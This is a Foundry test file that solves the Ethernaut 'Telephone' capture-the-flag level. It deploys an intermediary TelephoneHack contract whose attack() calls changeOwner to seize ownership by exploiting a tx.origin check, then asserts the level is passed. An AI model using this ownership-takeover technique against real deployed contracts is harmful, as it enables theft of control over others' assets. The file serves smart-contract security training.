// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Telephone/TelephoneFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

contract TelephoneTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testTelephoneHack() public {
        /****************
         * Factory setup *
         *************** */
        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone ethernautTelephone = Telephone(payable(levelAddress));

        /****************
         *    Attack     *
         *************** */
        TelephoneHack telephoneHack = new TelephoneHack(levelAddress);
        console.log("TelephoneHack address: %s", address(telephoneHack));
        telephoneHack.attack();
        console.log("Telephone owner: %s", ethernautTelephone.owner());
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract TelephoneHack {
    Telephone public challenge;

    // -- 1 --
    constructor(address challengeAddress) {
        challenge = Telephone(payable(challengeAddress));
    }

    // -- 2 --
    function attack() public {
        challenge.changeOwner(msg.sender);
    }
}
